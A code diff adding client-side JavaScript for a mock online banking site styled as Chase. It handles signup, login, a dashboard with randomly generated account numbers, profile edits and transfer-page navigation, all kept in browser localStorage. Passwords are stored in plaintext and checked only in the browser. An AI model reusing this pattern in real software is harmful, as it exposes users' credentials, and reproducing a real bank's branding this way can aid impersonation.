+      if (signupForm) {
+        signupForm.addEventListener('submit', (e) => {
+          e.preventDefault();
+          
+          const usernameInput = document.getElementById('signup-username').value.trim();
+          const passwordInput = document.getElementById('signup-password').value;
+          const emailInput = document.getElementById('signup-email').value.trim();
+          
+          // 1. Validate username (No email formats allowed)
+          if(usernameInput.includes('@')) {
+            signupError.textContent = "Username cannot be an email address.";
+            signupError.style.display = 'block';
+            return;
+          }
+
+          // 2. Get existing users array from localStorage
+          let users = JSON.parse(localStorage.getItem('chase_users') || '[]');
+
+          // 3. Check if username already exists
+          if (users.find(u => u.username.toLowerCase() === usernameInput.toLowerCase())) {
+            signupError.textContent = "This username is already taken.";
+            signupError.style.display = 'block';
+            return;
+          }
+
+          // 4. Create new user object with UNIQUE random account numbers
+          const uniqueAccountNum = Math.floor(1000 + Math.random() * 9000);
+          const uniqueCcNum = Math.floor(1000 + Math.random() * 9000);
+          
+          const newUser = {
+            username: usernameInput,
+            password: passwordInput,
+            email: emailInput,
+            accountNum: uniqueAccountNum,
+            ccNum: uniqueCcNum,
+            phone: '(555) 000-0000',
+            address: 'N/A'
+          };
+
+          // 5. Save to array and localStorage permanently
+          users.push(newUser);
+          localStorage.setItem('chase_users', JSON.stringify(users));
+          
+          const btn = document.getElementById('signup-btn');
+          btn.textContent = 'Processing...';
+          btn.disabled = true;
+
+          setTimeout(() => {
+            alert("Account created successfully! Please sign in.");
+            btn.textContent = 'Sign up';
+            btn.disabled = false;
+            signupForm.reset();
+            window.location.hash = '#signin';
+          }, 1000);
+        });
+      }
+
+      // --- LOGIN LOGIC ---
+      if (loginForm) {
+        loginForm.addEventListener('submit', (e) => {
+          e.preventDefault();
+          
+          const typedUser = document.getElementById('login-username').value.trim();
+          const typedPass = document.getElementById('login-password').value;
+
+          // 1. Validate username (No email formats allowed)
+          if (typedUser.includes('@')) {
+            loginError.textContent = "Please enter your username, not an email.";
+            loginError.style.display = 'block';
+            return;
+          }
+
+          // 2. Retrieve users
+          let users = JSON.parse(localStorage.getItem('chase_users') || '[]');
+          
+          // 3. Find matching user
+          const foundUser = users.find(u => u.username.toLowerCase() === typedUser.toLowerCase());
+
+          if (!foundUser) {
+            loginError.textContent = "Username not found. Please sign up first.";
+            loginError.style.display = 'block';
+            return;
+          }
+
+          // 4. Check password
+          if (foundUser.password !== typedPass) {
+            loginError.textContent = "Incorrect password.";
+            loginError.style.display = 'block';
+            return;
+          }
+
+          // 5. Successful login - save session
+          localStorage.setItem('chase_current_user', JSON.stringify(foundUser));
+          loginForm.reset();
+          window.location.hash = '#dashboard';
+        });
+      }
+
+      // --- DASHBOARD INIT ---
+      function initDashboard() {
+        const currentUserStr = localStorage.getItem('chase_current_user');
+        
+        // If no active session, kick back to sign-in
+        if (!currentUserStr) {
+          window.location.hash = '#signin';
+          return;
+        }
+
+        let user = JSON.parse(currentUserStr);
+        
+        // SELF-HEALING: Generate missing account numbers for old accounts
+        if (!user.accountNum || !user.ccNum) {
+          if (!user.accountNum) user.accountNum = Math.floor(1000 + Math.random() * 9000);
+          if (!user.ccNum) user.ccNum = Math.floor(1000 + Math.random() * 9000);
+          
+          localStorage.setItem('chase_current_user', JSON.stringify(user));
+          
+          let allUsers = JSON.parse(localStorage.getItem('chase_users') || '[]');
+          const index = allUsers.findIndex(u => u.username === user.username);
+          if (index > -1) {
+            allUsers[index].accountNum = user.accountNum;
+            allUsers[index].ccNum = user.ccNum;
+            localStorage.setItem('chase_users', JSON.stringify(allUsers));
+          }
+        }
+        
+        // --- REGION & TIMEZONE DETECTION ---
+        const now = new Date();
+        const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        
+        // Get the local hour in the user's specific timezone
+        const localHourString = now.toLocaleString('en-US', { timeZone: userTimeZone, hour: 'numeric', hour12: false });
+        const localHour = parseInt(localHourString, 10);
+        
+        let greetingPrefix = "Good evening";
+        if (localHour >= 5 && localHour < 12) {
+          greetingPrefix = "Good morning";
+        } else if (localHour >= 12 && localHour < 18) {
+          greetingPrefix = "Good afternoon";
+        }
+        
+        // Format the date using the user's local region
+        const options = { month: 'long', day: '2-digit', year: 'numeric' };
+        const userLocale = navigator.language || 'en-US';
+        const dateString = now.toLocaleDateString(userLocale, options);
+        
+        document.getElementById('greeting-text').textContent = `${greetingPrefix}, ${user.username}`;
+        document.getElementById('date-text').textContent = dateString;
+        
+        // Set Account Numbers explicitly linked to this user
+        document.getElementById('account-number-display').textContent = `...${user.accountNum}`;
+        document.getElementById('bill-account-label').textContent = `TOTAL CHECKING (...${user.accountNum})`;
+        document.getElementById('cc-number-display').textContent = `...${user.ccNum}`;
+
+        // Populate Profile automatically with the Gmail account used
+        document.getElementById('profile-display-name').textContent = user.username;
+        document.getElementById('profile-display-email').textContent = user.email;
+        document.getElementById('profile-username').textContent = user.username;
+        
+        // Populate Phone and Address
+        document.getElementById('profile-phone-display').textContent = user.phone || '(555) 000-0000';
+        document.getElementById('profile-address-display').textContent = user.address || 'N/A';
+
+        // --- DYNAMIC NEXT MONTH DATE FOR AUTO-PAY ---
+        const nextMonthDate = new Date(now.getFullYear(), now.getMonth() + 1, 21);
+        const nextMonthOptions = { month: 'long', day: '2-digit', year: 'numeric' };
+        const nextMonthString = nextMonthDate.toLocaleDateString(userLocale, nextMonthOptions);
+        document.getElementById('autopay-date').textContent = nextMonthString + '.';
+
+        // --- UPDATE FROM ACCOUNT DROPDOWNS ---
+        const accountString = `EVERYDAY CHECKING ...${user.accountNum} ($0.00)`;
+        document.querySelectorAll('.from-account-select').forEach(select => {
+          select.innerHTML = `<option>${accountString}</option>`;
+        });
+
+        // Reset view state
+        document.getElementById('dashboard-page').classList.remove('show-bills', 'show-pay', 'show-profile', 'show-internal', 'show-external', 'show-zelle', 'show-wire');
+        updateNavActive('nav-accounts');
+      }
+
+      // --- SUB-VIEW TOGGLES ---
+      const dashboardPage = document.getElementById('dashboard-page');
+      
+      const btnSeeBills = document.getElementById('btn-see-bills');
+      const btnBillsBack = document.getElementById('btn-bills-back');
+      
+      const navAccounts = document.getElementById('nav-accounts');
+      const navPay = document.getElementById('nav-pay');
+      const btnPayBack = document.getElementById('btn-pay-back');
+
+      const btnOpenProfile = document.getElementById('btn-open-profile');
+      const btnProfileBack = document.getElementById('btn-profile-back');
+      const btnSignOut = document.getElementById('btn-sign-out');
+
+      function updateNavActive(activeId) {
+        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+        if(document.getElementById(activeId)) {
+          document.getElementById(activeId).classList.add('active');
+        }
+      }
+
+      // Reset all views to main accounts
+      function resetToMainView() {
+        dashboardPage.classList.remove('show-bills', 'show-pay', 'show-profile', 'show-internal', 'show-external', 'show-zelle', 'show-wire');
+        updateNavActive('nav-accounts');
+      }
+
+      if (btnSeeBills) {
+        btnSeeBills.addEventListener('click', () => {
+          dashboardPage.classList.add('show-bills');
+          dashboardPage.classList.remove('show-pay', 'show-profile', 'show-internal', 'show-external', 'show-zelle', 'show-wire');
+        });
+      }
+
+      if (btnBillsBack) {
+        btnBillsBack.addEventListener('click', () => {
+          dashboardPage.classList.remove('show-bills');
+        });
+      }
+
+      if (navAccounts) {
+        navAccounts.addEventListener('click', resetToMainView);
+      }
+
+      if (navPay) {
+        navPay.addEventListener('click', () => {
+          dashboardPage.classList.add('show-pay');
+          dashboardPage.classList.remove('show-bills', 'show-profile', 'show-internal', 'show-external', 'show-zelle', 'show-wire');
+          updateNavActive('nav-pay');
+        });
+      }
+
+      if (btnPayBack) {
+        btnPayBack.addEventListener('click', resetToMainView);
+      }
+
+      if (btnOpenProfile) {
+        btnOpenProfile.addEventListener('click', () => {
+          dashboardPage.classList.add('show-profile');
+          dashboardPage.classList.remove('show-bills', 'show-pay', 'show-internal', 'show-external', 'show-zelle', 'show-wire');
+        });
+      }
+
+      if (btnProfileBack) {
+        btnProfileBack.addEventListener('click', resetToMainView);
+      }
+
+      // --- TRANSFER PAGE NAVIGATION ---
+      // Expose globally so onclick attributes in HTML can access them
+      window.goBackToPay = function() {
+        dashboardPage.classList.remove('show-internal', 'show-external', 'show-zelle', 'show-wire');
+        dashboardPage.classList.add('show-pay');
+      };
+
+      // Attach listeners to list items in Pay & Transfer
+      document.getElementById('trigger-internal').addEventListener('click', () => {
+        dashboardPage.classList.remove('show-pay');
+        dashboardPage.classList.add('show-internal');
+      });
+      
+      document.getElementById('trigger-external').addEventListener('click', () => {
+        dashboardPage.classList.remove('show-pay');
+        dashboardPage.classList.add('show-external');
+      });
+      
+      document.getElementById('trigger-zelle').addEventListener('click', () => {
+        dashboardPage.classList.remove('show-pay');
+        dashboardPage.classList.add('show-zelle');
+      });
+      
+      document.getElementById('trigger-wire').addEventListener('click', () => {
+        dashboardPage.classList.remove('show-pay');
+        dashboardPage.classList.add('show-wire');
+      });
+
+      // --- EDIT PHONE LOGIC ---
+      const phoneDisplay = document.getElementById('profile-phone-display');
+      const phoneEditWrapper = document.getElementById('phone-edit-wrapper');
+      const phoneInput = document.getElementById('profile-phone-input');
+      const btnEditPhone = document.getElementById('edit-phone-btn');
+      const btnSavePhone = document.getElementById('btn-save-phone');
+
+      if (btnEditPhone) {
+        btnEditPhone.addEventListener('click', () => {
+          phoneDisplay.style.display = 'none';
+          btnEditPhone.style.display = 'none';
+          phoneEditWrapper.style.display = 'flex';
+          
+          const currentPhone = phoneDisplay.textContent;
+          phoneInput.value = (currentPhone === '(555) 000-0000') ? '' : currentPhone;
+          phoneInput.focus();
+        });
+      }
+
+      if (btnSavePhone) {
+        btnSavePhone.addEventListener('click', (e) => {
+          e.preventDefault();
+          
+          const newPhone = phoneInput.value.trim() || '(555) 000-0000';
+          
+          phoneDisplay.textContent = newPhone;
+          phoneDisplay.style.display = 'inline-block';
+          btnEditPhone.style.display = 'inline-block';
+          phoneEditWrapper.style.display = 'none';
+
+          // Save permanently
+          const currentUserStr = localStorage.getItem('chase_current_user');
+          if (currentUserStr) {
+            let user = JSON.parse(currentUserStr);
+            user.phone = newPhone;
+            localStorage.setItem('chase_current_user', JSON.stringify(user));
+
+            let users = JSON.parse(localStorage.getItem('chase_users') || '[]');
+            const userIndex = users.findIndex(u => u.username === user.username);
+            if (userIndex > -1) {
+              users[userIndex].phone = newPhone;
+              localStorage.setItem('chase_users', JSON.stringify(users));
+            }
+          }
+        });
+      }
+
+      // --- EDIT ADDRESS LOGIC ---
+      const addressDisplay = document.getElementById('profile-address-display');
+      const addressEditWrapper = document.getElementById('address-edit-wrapper');
+      const addressInput = document.getElementById('profile-address-input');
+      const btnEditAddress = document.getElementById('edit-address-btn');
+      const btnSaveAddress = document.getElementById('btn-save-address');
+
+      if (btnEditAddress) {
+        btnEditAddress.addEventListener('click', () => {
+          addressDisplay.style.display = 'none';
+          btnEditAddress.style.display = 'none';
+          addressEditWrapper.style.display = 'flex';
+          
+          const currentAddr = addressDisplay.textContent;
+          addressInput.value = (currentAddr === 'N/A') ? '' : currentAddr;
+          addressInput.focus();
+        });
+      }
+
+      if (btnSaveAddress) {
+        btnSaveAddress.addEventListener('click', (e) => {
+          e.preventDefault();
+          
+          const newAddr = addressInput.value.trim() || 'N/A';
+          
+          addressDisplay.textContent = newAddr;
+          addressDisplay.style.display = 'inline-block';
+          btnEditAddress.style.display = 'inline-block';
+          addressEditWrapper.style.display = 'none';
+
+          // Save permanently
+          const currentUserStr = localStorage.getItem('chase_current_user');
+          if (currentUserStr) {
+            let user = JSON.parse(currentUserStr);
+            user.address = newAddr;
+            localStorage.setItem('chase_current_user', JSON.stringify(user));
+
+            let users = JSON.parse(localStorage.getItem('chase_users') || '[]');
+            const userIndex = users.findIndex(u => u.username === user.username);
+            if (userIndex > -1) {
+              users[userIndex].address = newAddr;
+              localStorage.setItem('chase_users', JSON.stringify(users));
+            }
+          }
+        });
+      }
+
+      // --- SIGN OUT LOGIC ---
+      if (btnSignOut) {
+        btnSignOut.addEventListener('click', () => {
+          if(confirm("Are you sure you want to sign out?")) {
+            localStorage.removeItem('chase_current_user');
+            window.location.hash = '';
+          }
+        });
+      }
+
+    });
+  </script>
+</body>
+</html>
